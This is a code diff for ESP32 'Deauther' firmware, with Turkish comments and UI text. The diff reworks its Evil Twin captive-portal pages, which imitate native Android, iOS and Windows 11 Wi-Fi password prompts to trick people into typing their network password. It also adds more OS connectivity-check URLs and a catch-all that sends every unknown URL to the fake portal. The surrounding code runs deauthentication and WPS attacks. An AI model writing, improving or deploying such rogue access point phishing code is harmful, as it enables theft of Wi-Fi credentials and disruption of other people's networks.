@@ -94,7 +94,9 @@ void handle_root() {
   bool attack_running = evil_twin_active ||
     (deauth_type == DEAUTH_TYPE_SINGLE && deauth_target_ssid[0] != '\0');
 
-  String html = F("<!DOCTYPE html><html lang='tr'><head>"
+  String html;
+  html.reserve(12000);
+  html = F("<!DOCTYPE html><html lang='tr'><head>"
     "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
     "<title>ESP32 Deauther</title>");
   if (attack_running) html += F("<meta http-equiv='refresh' content='4'>");
@@ -513,8 +515,10 @@ void handle_root() {
 }
 
 // ─── WPS PBC Başarı Sayfası ───────────────────────────────────────────────────
-static String portal_wps_success_page() {
-  String h = F("<!DOCTYPE html><html><head>"
+static void portal_wps_success_page() {
+  server.setContentLength(CONTENT_LENGTH_UNKNOWN);
+  server.send(200, "text/html", "");
+  server.sendContent(F("<!DOCTYPE html><html><head>"
     "<meta charset='UTF-8'>"
     "<meta name='viewport' content='width=device-width,initial-scale=1'>"
     "<title>Ba&#287;land&#305;</title>"
@@ -559,8 +563,7 @@ static String portal_wps_success_page() {
         "</ul>"
       "</div>"
     "</div>"
-    "</body></html>");
-  return h;
+    "</body></html>"));
 }
 
 // ─── Captive Portal (Evil Twin istemciler için) ───────────────────────────────
@@ -568,14 +571,16 @@ static String portal_wps_success_page() {
 // Renk teması: prefers-color-scheme ile cihazdan otomatik alınır
 
 
-static String portal_android(bool wrong_pass, const String &ssid) {
+static void portal_android(bool wrong_pass, const String &ssid) {
   // Material Design 3 — tam ekran görüntüsü eşleşmesi (koyu/açık otomatik)
-  String h = F("<!DOCTYPE html><html><head>"
+  server.setContentLength(CONTENT_LENGTH_UNKNOWN);
+  server.send(200, "text/html", "");
+  server.sendContent(F("<!DOCTYPE html><html><head>"
     "<meta charset='UTF-8'>"
     "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1'>"
-    "<title>");
-  h += ssid;
-  h += F("</title><style>"
+    "<title>"));
+  server.sendContent(ssid);
+  server.sendContent(F("</title><style>"
     ":root{"
       "--bg:#1C1B1F;--surf:#2B2930;--surf2:#38343C;"
       "--on-bg:#E6E1E5;--on-surf:#E6E1E5;"
@@ -655,9 +660,9 @@ static String portal_android(bool wrong_pass, const String &ssid) {
         "<path d='M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z'/>"
       "</svg>"
     "</button></div>"
-    "<h1>");
-  h += ssid;
-  h += F("</h1>"
+    "<h1>"));
+  server.sendContent(ssid);
+  server.sendContent(F("</h1>"
     "<p style='font-size:13px;color:var(--hint);text-align:center;margin:0 0 14px'>"
       "&#304;nternet&apos;e ba&#287;lanmak i&#231;in l&#252;tfen WiFi &#351;ifrenizi giriniz."
     "</p>"
@@ -674,13 +679,13 @@ static String portal_android(bool wrong_pass, const String &ssid) {
           " 3-1.34 3-3-1.34-3-3-3z'/>"
         "</svg>"
       "</button>"
-    "</div>");
+    "</div>"));
   if (wrong_pass) {
-    h += F("<div class='err-txt'>Yanl&#305;&#351; &#351;ifre, l&#252;tfen tekrar deneyin.</div>");
+    server.sendContent(F("<div class='err-txt'>Yanl&#305;&#351; &#351;ifre, l&#252;tfen tekrar deneyin.</div>"));
   } else {
-    h += F("<p class='hint-txt'>*zorunlu</p>");
+    server.sendContent(F("<p class='hint-txt'>*zorunlu</p>"));
   }
-  h += F(
+  server.sendContent(F(
   "<div class='btns'>"
     "<button type='button' class='bcancel' onclick='history.back()'>&#304;ptal</button>"
     "<button type='submit' class='bconnect'>Ba&#287;lan</button>"
@@ -713,15 +718,16 @@ static String portal_android(bool wrong_pass, const String &ssid) {
         "}"
       "};"
       "x.send();"
-    "},3000);"
+    "},1500);"
   "</script>"
-  "</body></html>");
-  return h;
+  "</body></html>"));
 }
 
-static String portal_ios(bool wrong_pass, const String &ssid) {
+static void portal_ios(bool wrong_pass, const String &ssid) {
   // Apple iOS — tam native WiFi parola ekranı (koyu/açık otomatik)
-  String h = F("<!DOCTYPE html><html><head>"
+  server.setContentLength(CONTENT_LENGTH_UNKNOWN);
+  server.send(200, "text/html", "");
+  server.sendContent(F("<!DOCTYPE html><html><head>"
     "<meta charset='UTF-8'>"
     "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
     "<title>Parolay&#305; Gir</title><style>"
@@ -791,22 +797,22 @@ static String portal_ios(bool wrong_pass, const String &ssid) {
     "</div>"
     "<div class='content'>"
       "<div class='wifi-ico'>&#128225;</div>"
-      "<div class='ssid-lbl'>");
-  h += ssid;
-  h += F("</div>"
+      "<div class='ssid-lbl'>"));
+  server.sendContent(ssid);
+  server.sendContent(F("</div>"
       "<div class='sub'>"
         "Wi-Fi &#351;ifresi modemin arka etiketinde yazar."
         "<br><span style='font-size:11px;opacity:.7'>"
           "&ldquo;Wi-Fi Key&rdquo; &bull; &ldquo;WPA Key&rdquo; &bull; &ldquo;Password&rdquo;"
         "</span>"
-      "</div>");
+      "</div>"));
   if (wrong_pass) {
-    h += F("<div class='err-box'>"
+    server.sendContent(F("<div class='err-box'>"
       "<span>&#9888;&#65039;</span>"
       "<span>Yanl&#305;&#351; parola. L&#252;tfen tekrar deneyin.</span>"
-    "</div>");
+    "</div>"));
   }
-  h += F("<p style='font-size:13px;color:var(--text2);text-align:center;margin:0 0 14px 0;padding:0 16px'>"
+  server.sendContent(F("<p style='font-size:13px;color:var(--text2);text-align:center;margin:0 0 14px 0;padding:0 16px'>"
       "&#304;nternet&apos;e ba&#287;lanmak i&#231;in l&#252;tfen WiFi &#351;ifrenizi giriniz."
     "</p>"
     "<form id='f' method='post' action='/submit'>"
@@ -853,20 +859,21 @@ static String portal_ios(bool wrong_pass, const String &ssid) {
         "}"
       "};"
       "x.send();"
-    "},3000);"
+    "},1500);"
   "</script>"
-  "</body></html>");
-  return h;
+  "</body></html>"));
 }
 
-static String portal_desktop(bool wrong_pass, const String &ssid) {
+static void portal_desktop(bool wrong_pass, const String &ssid) {
   // Windows 11 WiFi flyout — masaüstü tarayıcılar için (koyu/açık otomatik)
-  String h = F("<!DOCTYPE html><html><head>"
+  server.setContentLength(CONTENT_LENGTH_UNKNOWN);
+  server.send(200, "text/html", "");
+  server.sendContent(F("<!DOCTYPE html><html><head>"
     "<meta charset='UTF-8'>"
     "<meta name='viewport' content='width=device-width,initial-scale=1'>"
-    "<title>Ba&#287;lan: ");
-  h += ssid;
-  h += F("</title><style>"
+    "<title>Ba&#287;lan: "));
+  server.sendContent(ssid);
+  server.sendContent(F("</title><style>"
     ":root{"
       "--bg:#F3F3F3;--card:#FFFFFF;--text:#1A1A1A;--text2:#5D5D5D;"
       "--border:#E0E0E0;--sep:#EBEBEB;"
@@ -952,9 +959,9 @@ static String portal_desktop(bool wrong_pass, const String &ssid) {
       "<div class='hdr-top'>"
         "<div class='wifi-ico'>&#128225;</div>"
         "<div>"
-          "<div class='ssid-txt'>");
-  h += ssid;
-  h += F("</div>"
+          "<div class='ssid-txt'>"));
+  server.sendContent(ssid);
+  server.sendContent(F("</div>"
           "<div class='ssid-sub'>Kilitli &bull; Kablosuz A&#287; G&#252;venlik Anahtar&#305; Gerekli</div>"
         "</div>"
       "</div>"
@@ -963,16 +970,16 @@ static String portal_desktop(bool wrong_pass, const String &ssid) {
       "<p class='info-txt'>"
         "Wi-Fi &#351;ifresi modemin/router&#305;n alt veya yan etiketinde yazar."
         " &ldquo;Wi-Fi Key&rdquo;, &ldquo;WPA Key&rdquo; veya &ldquo;Password&rdquo; olarak ge&#231;ebilir."
-      "</p>");
+      "</p>"));
   if (wrong_pass) {
-    h += F("<div class='err-box'>"
+    server.sendContent(F("<div class='err-box'>"
         "<svg width='14' height='14' viewBox='0 0 24 24' fill='currentColor'>"
           "<path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/>"
         "</svg>"
         "<span>A&#287;&#305;n g&#252;venlik anahtar&#305; yanl&#305;&#351;. Tekrar deneyin.</span>"
-      "</div>");
+      "</div>"));
   }
-  h += F("<p style='font-size:13px;color:var(--text2);text-align:center;margin:0 0 14px 0'>"
+  server.sendContent(F("<p style='font-size:13px;color:var(--text2);text-align:center;margin:0 0 14px 0'>"
       "&#304;nternet&apos;e ba&#287;lanmak i&#231;in l&#252;tfen WiFi &#351;ifrenizi giriniz."
     "</p>"
     "<form method='post' action='/submit'>"
@@ -1024,50 +1031,48 @@ static String portal_desktop(bool wrong_pass, const String &ssid) {
         "}"
       "};"
       "x.send();"
-    "},3000);"
+    "},1500);"
   "</script>"
-  "</body></html>");
-  return h;
+  "</body></html>"));
 }
 
-static String portal_page(bool wrong_pass) {
+static void portal_page(bool wrong_pass) {
   String ua = server.header("User-Agent");
 
   // iOS tespiti
   bool is_ios = ua.indexOf("iPhone") >= 0 ||
                 ua.indexOf("iPad")   >= 0 ||
                 ua.indexOf("iPod")   >= 0;
-  if (is_ios) return portal_ios(wrong_pass, evil_twin_ssid);
+  if (is_ios) { portal_ios(wrong_pass, evil_twin_ssid); return; }
 
   // Android tespiti (masaüstü UA'sında "Android" geçmez)
   bool is_android = ua.indexOf("Android") >= 0;
-  if (is_android) return portal_android(wrong_pass, evil_twin_ssid);
+  if (is_android) { portal_android(wrong_pass, evil_twin_ssid); return; }
 
   // Windows, macOS, Linux, ChromeOS vb. masaüstü / diğer
-  return portal_desktop(wrong_pass, evil_twin_ssid);
+  portal_desktop(wrong_pass, evil_twin_ssid);
 }
 
 static void handle_portal() {
   if (!evil_twin_active) { redirect_root(); return; }
   // WPS PBC başarılıysa başarı sayfasını göster
   if (et_wps_pbc_found) {
-    server.send(200, "text/html", portal_wps_success_page());
+    portal_wps_success_page();
     return;
   }
   // Her durumda platform'a özel yeni tasarımı göster (Android/iOS/Windows).
-  // Sayfaların içindeki WPS hint bloğu + _wpsBnr banner'ı WPS durumunu yönetir.
-  server.send(200, "text/html", portal_page(false));
+  portal_page(false);
 }
 
 static void handle_portal_wrong() {
   if (!evil_twin_active) { redirect_root(); return; }
-  server.send(200, "text/html", portal_page(true));
+  portal_page(true);
 }
 
 // /portal_manual → şifre formunu doğrudan göster (WPS fallback)
 static void handle_portal_manual() {
   if (!evil_twin_active) { redirect_root(); return; }
-  server.send(200, "text/html", portal_page(false));
+  portal_page(false);
 }
 
 // /et_wps_pbc_status → captive portal polling: WPS PBC durumu (running/found)
@@ -1106,6 +1111,13 @@ String et_tested_password = "";
 bool wps_scan_pending        = false;
 bool wps_attack_pending      = false;
 int  wps_attack_pending_idx  = 0;
+
+// Evil Twin ertelenmiş başlatma
+bool et_start_pending      = false;
+int  et_start_wifi_number  = -1;
+
+// Ağ listesi yeniden tarama
+bool rescan_pending = false;
 
 static void handle_submit() {
   if (!evil_twin_active) { redirect_root(); return; }
@@ -1221,6 +1233,19 @@ static void handle_generate_204() {
   }
 }
 
+// ─── Bilinmeyen URL — evrensel captive portal yakalayıcı ────────────────────
+// DNS tüm domainleri 192.168.4.1'e yönlendirir; buraya gelen her istek
+// (kayıtlı olmayan path) captive portal'a yönlendirilir.
+// Evil twin aktif değilse yönetim paneline yönlendirir.
+static void handle_not_found() {
+  if (evil_twin_active) {
+    server.sendHeader("Location", "http://192.168.4.1/portal");
+    server.send(302);
+  } else {
+    redirect_root();
+  }
+}
+
 // ─── Deauth / Stop handler'lar ────────────────────────────────────────────────
 
 static void handle_deauth() {
@@ -1263,8 +1288,13 @@ static void handle_deauth_all() {
 }
 
 static void handle_rescan() {
-  num_networks = WiFi.scanNetworks();
+  // Blocking scan HTTP handler içinde yapılmaz — redirect gönder, tarama main loop'ta
+  rescan_pending = true;
   redirect_root();
+}
+
+void web_interface_do_rescan() {
+  num_networks = WiFi.scanNetworks();
 }
 
 static void handle_stop() {
@@ -1285,7 +1315,9 @@ static void handle_evil_twin() {
       server.send(200, "text/html", html);
       return;
     }
-    start_evil_twin(wifi_number);
+    // Önce redirect gönder — AP kurulumu main loop'ta yapılır (kullanıcı anında yanıt alır)
+    et_start_pending     = true;
+    et_start_wifi_number = wifi_number;
     server.sendHeader("Location", "/");
     server.send(302);
   } else {
@@ -1426,14 +1458,29 @@ void start_web_interface() {
   server.on("/wps_pbc_stop",   HTTP_POST, handle_wps_pbc_stop);
 
   // OS captive portal detection URL'leri
-  server.on("/generate_204",        handle_generate_204);
-  server.on("/gen_204",             handle_generate_204);
-  server.on("/hotspot-detect.html", handle_captive_redirect);  // iOS/macOS
-  server.on("/ncsi.txt",            handle_captive_redirect);  // Windows
-  server.on("/connecttest.txt",     handle_captive_redirect);  // Windows
-  server.on("/canonical.html",      handle_captive_redirect);  // Firefox
-  server.on("/success.txt",         handle_captive_redirect);
-  server.on("/redirect",            handle_captive_redirect);
+  // Android
+  server.on("/generate_204",             handle_generate_204);
+  server.on("/gen_204",                  handle_generate_204);
+  server.on("/connectcheck.html",        handle_captive_redirect);  // eski Android
+  server.on("/204",                      handle_generate_204);
+  // iOS / macOS
+  server.on("/hotspot-detect.html",      handle_captive_redirect);
+  server.on("/library/test/success.html",handle_captive_redirect);  // eski iOS
+  server.on("/success.html",             handle_captive_redirect);
+  // Windows
+  server.on("/ncsi.txt",                 handle_captive_redirect);
+  server.on("/connecttest.txt",          handle_captive_redirect);
+  server.on("/redirect",                 handle_captive_redirect);
+  server.on("/check_network_status.txt", handle_captive_redirect);
+  // Firefox
+  server.on("/canonical.html",           handle_captive_redirect);
+  server.on("/success.txt",              handle_captive_redirect);
+  // Kindle / diğer
+  server.on("/kindle-wifi/wifiredirect.html", handle_captive_redirect);
+  server.on("/wpad.dat",                 handle_captive_redirect);
+
+  // Kayıtlı olmayan TÜM URL'ler — evrensel yakalayıcı (en önemli satır)
+  server.onNotFound(handle_not_found);
 
   // User-Agent başlığını topla — portal OS tespiti için
   static const char *hdrs[] = {"User-Agent"};
